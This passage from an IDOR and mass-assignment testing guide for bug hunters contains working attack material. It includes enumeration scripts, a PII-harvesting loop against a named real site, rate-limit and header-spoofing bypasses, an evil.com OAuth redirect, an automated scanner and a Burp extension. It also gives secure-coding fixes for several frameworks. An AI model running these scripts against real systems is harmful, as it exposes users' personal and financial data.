    "quota": 999999,
    "max_users": 99999,
    "rate_limit": 0,
    "status": "active",
    "membership_status": "active",
    "is_active": True,
    "is_verified": True
}

ENDPOINTS = [
    "/api/users/me",
    "/api/users/profile",
    "/api/users/settings",
    "/api/user/update",
    "/api/profile/update",
    "/api/account/update",
    "/api/settings/update",
    "/api/v1/users/me",
    "/api/v2/users/me",
]

session = requests.Session()
session.headers.update({"Authorization": TOKEN, "Content-Type": "application/json"})

# First, get baseline profile
baseline = session.get(f"{TARGET}/api/users/me").json()
print(f"[*] Baseline: {json.dumps(baseline, indent=2)}")

# Try each field
for field, value in PROBE_FIELDS.items():
    for endpoint in ENDPOINTS:
        try:
            payload = {field: value}
            r = session.patch(f"{TARGET}{endpoint}", json=payload)
            if r.status_code == 200:
                # Verify the field was persisted
                profile = session.get(f"{TARGET}/api/users/me").json()
                if profile.get(field) == value:
                    print(f"[!] MASS ASSIGN: {endpoint} → {field}={value}")
                elif str(profile.get(field)) == str(value):
                    print(f"[!] MASS ASSIGN (coerced): {endpoint} → {field}={value}")
        except:
            continue
```

## 9. IDOR in Different Contexts

### 9.1 File/Download IDOR

```bash
# Sequential file IDs
curl -s "https://target.com/download.php?id=1" -H "Cookie: $SESSION"
curl -s "https://target.com/download.php?id=2" -H "Cookie: $SESSION"

# UUID file IDs (may be leaked elsewhere)
curl -s "https://target.com/files/550e8400-e29b-41d4-a716-446655440000" \
  -H "Authorization: Bearer $TOKEN_A"
# File ID might be in: /api/notifications, /api/activities, /api/documents/list

# Path-based files
curl -s "https://target.com/files/user_1042_report.pdf" \
  -H "Authorization: Bearer $TOKEN_A"
curl -s "https://target.com/files/user_1043_report.pdf" \
  -H "Authorization: Bearer $TOKEN_A"

# ffuf for file enumeration
ffuf -u "https://target.com/download.php?id=FUZZ" \
  -H "Cookie: $SESSION" \
  -w <(seq 0 1000) \
  -fr 'File Not Found|not exist' \
  -o file_hits.json
```

### 9.2 Invoice/Billing IDOR

```bash
# Invoice enumeration (high financial impact)
curl -s "https://target.com/api/invoices/INV-2024-00001" -H "Authorization: Bearer $TOKEN_A"
curl -s "https://target.com/api/invoices/INV-2024-00002" -H "Authorization: Bearer $TOKEN_A"

# Payment history
curl -s "https://target.com/api/payments/12345" -H "Authorization: Bearer $TOKEN_A"
curl -s "https://target.com/api/payments/12346" -H "Authorization: Bearer $TOKEN_A"

# Billing info
curl -s "https://target.com/api/billing/1043/method" -H "Authorization: Bearer $TOKEN_A"
```

### 9.3 Webhook/Log IDOR

```bash
# Webhook logs often contain sensitive data
curl -s "https://target.com/api/webhooks/logs?id=1" -H "Authorization: Bearer $TOKEN_A"
curl -s "https://target.com/api/webhooks/logs?id=2" -H "Authorization: Bearer $TOKEN_A"

# Audit logs
curl -s "https://target.com/api/audit/log?user_id=1043" -H "Authorization: Bearer $TOKEN_A"
curl -s "https://target.com/api/audit/log/12345" -H "Authorization: Bearer $TOKEN_A"
```

### 9.4 OAuth Token/Callback IDOR

```bash
# OAuth callback may expose user IDs
curl "https://target.com/oauth/callback?code=AUTH_CODE&state=STATE"
# Intercept: does the callback response include user_id?

# OAuth token exchange
curl -X POST "https://target.com/oauth/token" \
  -d 'grant_type=authorization_code&code=CODE&redirect_uri=https://evil.com'
# Can you modify user_id in token exchange?
```

## 10. Case Studies

### 10.1 McHire — 64M Records via Sequential IDOR (2025)

An 8-digit numeric `lead_id` parameter on `PUT /api/lead/cem-xhr` was sequential. Using any authenticated session, decreasing the lead_id returned other applicants' full PII (name, email, phone, address) plus a consumer JWT allowing session hijacking.

```bash
# PoC: iterate lead_id from your own down to 1
for lead_id in $(seq 64185742 1); do
  curl -s -X PUT "https://www.mchire.com/api/lead/cem-xhr" \
    -H "Content-Type: application/json" \
    -H "Cookie: auth=$TOKEN" \
    -d "{\"lead_id\":$lead_id}" | jq -c '{email, name, phone}' 2>/dev/null
done
```

### 10.2 Wristband QR Codes as Bearer Tokens (2025)

Wristband IDs like `C-285-100` were ASCII-hex-encoded as URLs (e.g., `432d3238352d313030`). The backend checked only that the ID existed — not that the current user was the wristband owner. ~26M combinations, trivially brute-forced at 139 req/s.

### 10.3 Langflow — Mass Assignment to Super Admin (2024)

`PATCH /api/v1/users/[USER_ID]` with `{"is_superuser":true}` granted super admin. No ownership or role validation on the endpoint.

```bash
curl -X PATCH "https://target.com/api/v1/users/$MY_ID" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"is_superuser":true}'
```

### 10.4 IDOR Chain — Edit Any User's Role, Activate/Deactivate (2025)

A user management endpoint accepted `user_id`, `roles_to_be_added`, `roles_to_be_removed`, and `status` without checking if the caller was admin. Sequential user IDs leaked via a separate GET IDOR.

```bash
curl -X POST "https://target.com/identity-management/update-user" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": 1058,
    "roles_to_be_added": [1],
    "roles_to_be_removed": [352],
    "status": "active"
  }'
```

## 11. IDOR Detection Checklist

- [ ] Test all CRUD methods (GET, POST, PUT, PATCH, DELETE) on every endpoint with object references
- [ ] Test with two accounts: switch Account A's session to access Account B's objects
- [ ] Test sequential ID enumeration (+1, -1, +100, -100 around your ID)
- [ ] Test all content types (JSON, XML, Form-encoded, multipart)
- [ ] Test all API versions (v1, v2, v3, internal, beta, legacy)
- [ ] Test parameter pollution (duplicate params, array notation)
- [ ] Test JSON/array injection (wildcards, arrays, nested objects)
- [ ] Test mass assignment (role, is_admin, permissions, account_type)
- [ ] Test static keyword substitution (me, current, self → numeric IDs)
- [ ] Test path traversal in ID parameters
- [ ] Test method override headers
- [ ] Test for second-order IDOR (ID stored, retrieved later without re-auth)
- [ ] Test GraphQL queries/mutations with other users' IDs
- [ ] Test WebSocket messages with other users' IDs
- [ ] Test async endpoints (exports, jobs, password resets)
- [ ] Test webhook/audit logs for ID enumeration
- [ ] Check response differences between valid/invalid IDs (error oracle)
- [ ] Check UUID predictability (v1 timestamp, MongoDB ObjectID structure)
- [ ] Test hash-based IDs (MD5/SHA1/base64 of known values)
- [ ] Test file/download endpoints with sequential IDs

## 12. Impact Escalation in Reports

| IDOR Type | Base Severity | Chain To | Final Severity |
|-----------|--------------|----------|----------------|
| Read IDOR (non-sensitive) | Medium | + Write IDOR | High |
| Read IDOR (PII/Financial) | High | + Mass Assignment | Critical |
| Write IDOR (email/profile) | High | + Password Reset | Critical ATO |
| Write IDOR (role) | Critical | + Admin Endpoints | Critical |
| Write IDOR + Mass Assignment | Critical | + Create Backdoor User | Critical |
| File IDOR | Medium | + Cloud Bucket Enum | High |
| Blind IDOR | Low | + Error Oracle | Medium |
| GraphQL IDOR | High | + Field Suggestion | Medium |

## 13. Common Pitfalls & False Positives

- **Same data for all IDs** → You're seeing cached/public data, not a real IDOR
- **403 for foreign IDs** → Authorization IS working, move on
- **UUID changes each request** → Using non-predictable tokens, try leak-first approach
- **Rate limiting kicks in** → Slow down, use distributed testing
- **Returned data is your own** → ID parameter might be overridden by session
- **Public endpoint, no auth needed** → Check if the endpoint requires auth at all
- **CORS errors** → Response is blocked by browser but server responded — check server-side

## 14. Per-Framework IDOR Testing

### 14.1 Rails

Rails uses `params[:id]` directly from the URL. Mass assignment via `params.permit(:name, :email)` vs `params.permit!.permit(:name, :email, :role)` — the latter allows role injection.

```ruby
# Vulnerable pattern — permits everything
User.update(params.permit!)

# Safe pattern — explicit allowlist
User.update(params.permit(:name, :email))
```

Test: Add extra fields like `role: "admin"` to PATCH/PUT requests. Rails strong parameters may reject unknown keys silently — check response body to see if field was persisted.

### 14.2 Laravel/Eloquent

Laravel's `$fillable` vs `$guarded` determines mass assignment safety. `$guarded = []` means all fields are mass-assignable.

```php
// Vulnerable — no fillable defined
protected $guarded = [];

// Safe — explicit allowlist
protected $fillable = ['name', 'email'];
```

Test: Send `role: "admin"`, `is_admin: true`, `is_superuser: true` to any POST/PUT endpoint. If the field is accepted, Laravel's Eloquent allows mass assignment.

### 14.3 Django REST Framework

DRF serializers define which fields are writeable. A ModelSerializer without `read_only_fields` or explicit fields allows all model fields to be written.

```python
# Vulnerable — exposes all model fields
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User

# Safe — explicit fields
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = ['name', 'email']
        read_only_fields = ['role', 'is_staff']
```

Test: Send `is_staff: true`, `is_superuser: true`, `groups: [1]`, `user_permissions: [1]` to PATCH endpoints.

### 14.4 Spring Boot / Jackson

Jackson's `@JsonIgnore` controls serialization but if a setter exists, the field may still be deserialized. Spring's `@JsonProperty(access = READ_ONLY)` is safer.

```java
// Vulnerable — setter exists, Jackson binds it
public void setRole(String role) { this.role = role; }

// Safer — but still writable if @JsonIgnore not paired with setter absence
@JsonIgnore
public void setRole(String role) { this.role = role; }
```

Test: Add `role: "ROLE_ADMIN"`, `admin: true`, `enabled: true` to JSON bodies.

### 14.5 ASP.NET / Model Binding

ASP.NET binds request body to model properties via `[FromBody]`. Without `[Bind(Include = "...")]`, all public properties are bound.

```csharp
// Vulnerable — all properties bound
public IActionResult Update([FromBody] UserModel model)

// Safe — explicit inclusion
public IActionResult Update([FromBody][Bind(Include = "Name,Email")] UserModel model)
```

Test: Add `IsAdmin: true`, `Role: "Admin"`, `IsApproved: true` to JSON bodies.

### 14.6 Express / Mongoose

Mongoose's `findByIdAndUpdate` passes the entire body to MongoDB. Without a whitelist, any field can be updated.

```javascript
// Vulnerable — accepts any body field
User.findByIdAndUpdate(req.params.id, req.body);

// Safe — explicit whitelist
const allowed = ['name', 'email'];
User.findByIdAndUpdate(req.params.id, _.pick(req.body, allowed));
```

Test: Add `role: "admin"`, `isAdmin: true`, `isManager: true` to JSON bodies in all update operations.

### 14.7 GraphQL Resolvers

GraphQL resolvers often query by ID without checking authorization:

```javascript
// Vulnerable — no auth check on individual user query
const resolvers = {
  Query: {
    user: (parent, { id }, context) => User.findById(id),
  },
};

// Safe — enforces that caller can only see their own data
const resolvers = {
  Query: {
    user: (parent, { id }, context) => {
      if (context.user.id !== id && !context.user.isAdmin) {
        throw new Error('Unauthorized');
      }
      return User.findById(id);
    },
  },
};
```

Test: Query `user(id: 1043)` while authenticated as user 1042. If resolver returns the data, it's an IDOR.

## 15. Bypassing Common Defenses

### 15.1 UUID / Non-Sequential IDs

Even with UUIDs, IDORs exist — you just need to leak the UUID first:

```bash
# UUID leak from other endpoints
curl -s "https://target.com/api/notifications" -H "Authorization: Bearer $TOKEN" | jq -r '.notifications[].metadata.user_uuid'
curl -s "https://target.com/api/activities" -H "Authorization: Bearer $TOKEN" | jq -r '.activities[].actor.uuid'
curl -s "https://target.com/api/documents" -H "Authorization: Bearer $TOKEN" | jq -r '.documents[].owner.uuid'

# UUID leak from JS files
grep -oP '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' all_js.txt | sort -u

# UUID leak from GraphQL
curl -s https://target.com/graphql -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{users(first:100){edges{node{id uuid email role}}}}"}'
```

### 15.2 Rate Limiting

```bash
# Distributed enumeration with delays
for id in $(seq 1000 1100); do
  curl -s "https://target.com/api/users/$id" -H "Authorization: Bearer $TOKEN"
  sleep 0.$((RANDOM % 5))  # Random delay 0.1-0.5s
done

# Use multiple sessions
for id in $(seq 1000 1100); do
  case $((id % 3)) in
    0) TOKEN=$TOKEN_A ;;
    1) TOKEN=$TOKEN_B ;;
    2) TOKEN=$TOKEN_C ;;
  esac
  curl -s "https://target.com/api/users/$id" -H "Authorization: Bearer $TOKEN"
done

# IP rotation via proxies
for id in $(seq 1000 1100); do
  curl -s -x "http://proxy$((id % 10 + 1)):8080" \
    "https://target.com/api/users/$id" \
    -H "Authorization: Bearer $TOKEN"
done
```

### 15.3 Encoded / Obfuscated IDs

```bash
# Base64 variations
echo -n "1043" | base64                    # MTA0Mw==
echo -n "1043" | base64 | tr -d '='        # MTA0Mw
echo -n "user:1043" | base64              # dXNlcjoxMDQz
echo -n "id=1043" | base64                # aWQ9MTA0Mw==

# Hex encoding
echo -n "1043" | xxd -p                   # 31303433
echo -n "user_1043" | xxd -p             # 757365725f31303433

# Double encoding
echo -n "1043" | base64 | base64          # TVRBME13PT0=

# Custom encoding patterns
# Look at YOUR OWN ID carefully — decode it to see the pattern
# Sometimes it's: encrypt(salt + ":" + user_id)
# The salt might be shared (client-side key in JS)
```

### 15.4 Referer / Origin Checks

Some apps check the Referer or Origin header:

```bash
# Bypass by spoofing internal referer
curl -s "https://target.com/api/admin/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Referer: https://target.com/admin/dashboard" \
  -H "Origin: https://target.com"

# X-Forwarded-For bypass
curl -s "https://target.com/api/internal/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 10.0.0.1"

# Accept header manipulation
curl -s "https://target.com/api/internal/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/xml"
```

## 16. Mobile API IDOR

Mobile apps often use different API endpoints with weaker auth:

```bash
# Decrypt mobile traffic
# Use mitmproxy to capture mobile API calls
# Mobile apps hardcode API keys, tokens, or use different auth schemes

# Common mobile API patterns
curl "https://target.com/mobile/v1/users/1043" -H "X-API-Key: $MOBILE_KEY"
curl "https://target.com/mobile/v2/users/1043" -H "X-Device-Id: $DEVICE_ID"

# Mobile endpoints may not validate tokens the same way
curl "https://target.com/api/v3/users/1043" -H "Authorization: Bearer $SHORT_TOKEN"
# Mobile uses short-lived tokens that expire fast but have no scope validation
```

## 17. Reporting Pro-Tips

- **Always demonstrate with TWO accounts** — show Account A accessing Account B's data
- **Chain for maximum impact** — disclosure → write → escalation is stronger than any single IDOR
- **Include exact curl commands** — triagers love copy-paste reproducibility
- **Screenshot BEFORE and AFTER** — show the ID change and the resulting data access
- **Data counts matter** — "Accessed 10,000 user records" > "Could access other users' data"
- **Show the business impact** — PII exposure, financial data, ATO capability
- **Test with fresh accounts** — repeat the exploit from a clean session
- **Check for persistence** — does the IDOR work from different IPs, browsers, after logout/login?
- **Avoid aggressive enumeration** — don't scrape all 10M records, show the proof with a sample

## 18. Automation Scripts

### 18.1 Full IDOR Scanner (Python)

```python
#!/usr/bin/env python3
"""
IDOR & BOLA Automated Scanner

Tests all CRUD endpoints across API versions, content types, and method variations.
Outputs confirmed access control failures with evidence.
"""
import requests
import concurrent.futures
import json
import argparse
import sys
import time
import random
from urllib.parse import urljoin

class IDORScanner:
    def __init__(self, base_url, token_a, token_b, user_id_a, user_id_b):
        self.base_url = base_url.rstrip('/')
        self.session_a = requests.Session()
        self.session_a.headers.update({
            "Authorization": f"Bearer {token_a}",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"
        })
        self.session_b = requests.Session()
        self.session_b.headers.update({
            "Authorization": f"Bearer {token_b}",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"
        })
        self.uid_a = user_id_a
        self.uid_b = user_id_b
        self.findings = []

    def test_endpoint(self, endpoint_pattern, methods=None):
        """Test an endpoint pattern for IDOR across multiple methods and content types"""
        if methods is None:
            methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS']

        for method in methods:
            url = endpoint_pattern.replace('{id}', str(self.uid_b))

            # Test with Account A's token against Account B's resource
            try:
                if method == 'GET':
                    r = self.session_a.get(url)
                elif method == 'POST':
                    r = self.session_a.post(url, json={"user_id": self.uid_b})
                elif method == 'PUT':
                    r = self.session_a.put(url, json={"name": "idor_test", "user_id": self.uid_b})
                elif method == 'PATCH':
                    r = self.session_a.patch(url, json={"name": "idor_test", "user_id": self.uid_b})
                elif method == 'DELETE':
                    r = self.session_a.delete(url)
                elif method == 'HEAD':
                    r = self.session_a.head(url)
                elif method == 'OPTIONS':
                    r = self.session_a.options(url)

                # A 200/204 on Account B's resource using Account A's token = likely IDOR
                if r.status_code in [200, 201, 204]:
                    # Verify it's not a cached/empty response
                    content_len = len(r.content)
                    if content_len > 0 and content_len != self._get_baseline_length(endpoint_pattern, method):
                        self.findings.append({
                            "endpoint": url,
                            "method": method,
                            "status": r.status_code,
                            "content_length": content_len,
                            "evidence": r.text[:500]
                        })
                        print(f"[!] IDOR: {method} {url} -> {r.status_code} ({content_len} bytes)")
            except Exception as e:
                pass

    def _get_baseline_length(self, pattern, method):
        """Get response length for own resource to compare"""
        url = pattern.replace('{id}', str(self.uid_a))
        try:
            r = self.session_a.get(url)
            return len(r.content)
        except:
            return 0

    def test_mass_assignment(self, endpoint):
        """Test endpoint for mass assignment vulnerabilities"""
        fields = [
            {"role": "admin"},
            {"is_admin": True},
            {"is_superuser": True},
            {"permissions": ["admin", "read", "write", "delete"]},
            {"account_type": "enterprise"},
            {"verified": True},
            {"role_id": 1},
            {"plan": "enterprise_unlimited"},
            {"tier": "premium"}
        ]

        for field in fields:
            try:
                r = self.session_a.patch(
                    urljoin(self.base_url, endpoint),
                    json=field
                )
                if r.status_code == 200:
                    # Verify field persisted
                    verify = self.session_a.get(urljoin(self.base_url, endpoint))
                    verify_data = verify.json()
                    for k, v in field.items():
                        if k in verify_data and verify_data[k] == v:
                            print(f"[!] MASS ASSIGN: {endpoint} -> {k}={v}")
                            self.findings.append({
                                "type": "mass_assignment",
                                "endpoint": endpoint,
                                "field": k,
                                "value": str(v)
                            })
            except:
                pass

    def scan_endpoint_list(self, endpoints):
        """Scan a list of endpoint patterns for IDOR"""
        print(f"[*] Testing {len(endpoints)} endpoints for IDOR...")
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for ep in endpoints:
                futures.append(executor.submit(self.test_endpoint, ep))
            concurrent.futures.wait(futures)

    def report(self, output_file="idor_findings.json"):
        """Write findings to JSON"""
        with open(output_file, 'w') as f:
            json.dump(self.findings, f, indent=2)
        print(f"\n[+] {len(self.findings)} findings written to {output_file}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="IDOR/BOLA Automated Scanner")
    parser.add_argument("--url", required=True, help="Base URL (e.g., https://target.com)")
    parser.add_argument("--token-a", required=True, help="Account A (attacker) token")
    parser.add_argument("--token-b", required=True, help="Account B (victim) token")
    parser.add_argument("--uid-a", type=int, required=True, help="Account A user ID")
    parser.add_argument("--uid-b", type=int, required=True, help="Account B user ID")
    args = parser.parse_args()

    scanner = IDORScanner(args.url, args.token_a, args.token_b, args.uid_a, args.uid_b)

    endpoints = [
        "/api/users/{id}",
        "/api/users/{id}/profile",
        "/api/users/{id}/settings",
        "/api/users/{id}/documents",
        "/api/users/{id}/permissions",
        "/api/users/{id}/roles",
        "/api/v1/users/{id}",
        "/api/v2/users/{id}",
        "/api/profile/{id}",
        "/api/account/{id}",
        "/api/orders/{id}",
        "/api/invoices/{id}",
        "/api/messages/{id}",
        "/api/notifications/{id}",
        "/api/documents/{id}",
        "/api/files/{id}",
        "/api/uploads/{id}",
        "/api/payments/{id}",
        "/api/transactions/{id}",
        "/api/subscriptions/{id}",
    ]

    scanner.scan_endpoint_list(endpoints)

    for ep in ["/api/users/me", "/api/users/profile", "/api/users/settings"]:
        scanner.test_mass_assignment(ep)

    scanner.report()
```

### 18.2 Burp Suite Automation

```python
# Burp Extender API - Auto IDOR Detector
# Save as: idor_detector.py, load in Burp via Extender -> Add

from burp import IBurpExtender, IScannerCheck, IScanIssue
from java.util import ArrayList
from java.net import URL

class BurpExtender(IBurpExtender, IScannerCheck):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Auto IDOR Detector")
        callbacks.registerScannerCheck(self)
        print("[+] IDOR Detector loaded")
        print("[+] Methodology: For every request, re-sends with modified IDs")
        print("[+] Flags any response that differs from baseline")

    def doPassiveScan(self, baseRequestResponse):
        return None

    def doActiveScan(self, baseRequestResponse, insertionPoint):
        issues = ArrayList()
        request = baseRequestResponse.getRequest()
        analyzed = self._helpers.analyzeRequest(request)
        params = analyzed.getParameters()

        for param in params:
            name = param.getName().lower()
            value = param.getValue()

            # Check if parameter name matches ID patterns
            if any(pat in name for pat in ['id', 'uid', 'uuid', 'user', 'account', 'profile']):
                # Skip if value is not numeric
                if not value.isdigit():
                    continue

                # Test with incremented ID
                if value.isdigit():
                    test_val = str(int(value) + 1)
                    check_request = self._helpers.buildParameter(
                        request, self._helpers.buildParameter(
                            name, test_val, param.getType()
                        ),
                        True  # flag updated
                    )

                # Re-encode and send
                check = self._callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(),
                    check_request
                )

                # Compare responses
                if check.getResponse() != baseRequestResponse.getResponse():
                    issues.add(self._make_issue(
                        baseRequestResponse,
                        "[IDOR] Parameter " + name + " accepts modified values",
                        "The parameter " + name + " appears to accept modified object references. "
                        "Original: " + value + ", Tested: " + test_val
                    ))

        return issues if issues.size() > 0 else None

    def _make_issue(self, baseRequestResponse, name, detail):
        return CustomScanIssue(
            baseRequestResponse.getHttpService(),
            self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
            [baseRequestResponse],
            name,
            detail,
            "High"
        )

class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity

    def getUrl(self): return self._url
    def getIssueName(self): return self._name
    def getIssueType(self): return 0x08000000
    def getSeverity(self): return self._severity
    def getConfidence(self): return "Certain"
    def getIssueBackground(self): return None
    def getRemediationBackground(self): return None
    def getIssueDetail(self): return self._detail
    def getRemediationDetail(self): return None
    def getHttpMessages(self): return self._httpMessages
    def getHttpService(self): return self._httpService
```

## 19. IDOR in Microservices

### 19.1 Internal Service Trust

Microservices often trust each other's internal network. External-facing APIs may lack authorization on the assumption that only trusted services can access them.

```bash
# Test internal service endpoints directly
curl "https://target.com/internal/users/1043" -H "Authorization: Bearer $TOKEN"
curl "https://target.com/backend/users/1043" -H "Authorization: Bearer $TOKEN"
curl "https://target.com/services/users/1043" -H "Authorization: Bearer $TOKEN"

# If blocked on external domain, try subdomain:
curl "https://internal-api.target.com/users/1043" -H "Authorization: Bearer $TOKEN"
curl "https://backend.target.com/api/users/1043" -H "Authorization: Bearer $TOKEN"

# Service-to-service auth headers
curl "https://target.com/api/users/1043" \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-Internal-Secret: supers3cret" \
  -H "X-Service-Name: notification-service" \
  -H "X-Forwarded-For: 10.0.0.1"
```

### 19.2 Event-Driven / Queue-Based IDOR

Async processing is a rich IDOR hunting ground because auth is checked at submission but not at execution:

```bash
# Image processing pipeline
curl -X POST "https://target.com/api/images/process" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"image_id": "victim_image_123", "operation": "resize"}'

# Video transcoding
curl -X POST "https://target.com/api/videos/transcode" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"video_id": "victim_video_456", "format": "mp4"}'

# Document conversion
curl -X POST "https://target.com/api/documents/convert" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"document_id": "victim_doc_789", "target_format": "pdf"}'

# Email trigger
curl -X POST "https://target.com/api/emails/send" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"template": "welcome", "user_id": 1043}'
```

## 20. Practical Testing Workflow

### Step-by-step IDOR hunting session:

```
1. Create two accounts (A = attacker, B = victim)
   - Note all IDs, UUIDs, emails for both accounts

2. Capture baseline
   - Browse as Account A, save every API request/response
   - Browse as Account B, save every API request/response

3. Identify ID parameters
   - Extract all IDs, UUIDs, hashes from both accounts' traffic
   - Compile a list of endpoint patterns with {id} placeholders

4. Systematic substitution
   - For every endpoint Account A accessed, replace A's ID with B's ID
   - For every endpoint Account B accessed, replace B's ID with A's ID
   - Note all 200/201/204 responses (these are potential IDORs)

5. Verify each candidate
   - Send the request again from a fresh session
   - Confirm the data returned actually belongs to the other account
   - Check that the data is not cached/public

6. Chain escalation
   - Can you READ sensitive data? → Write IDOR?
   - Can you WRITE? → Mass assignment for privilege escalation?
   - Can you escalate? → Admin actions?

7. Document impact
   - What data was accessed? (PII, financial, credentials)
   - What actions were performed? (modification, deletion)
   - What is the business impact? (GDPR, fraud, ATO)
```
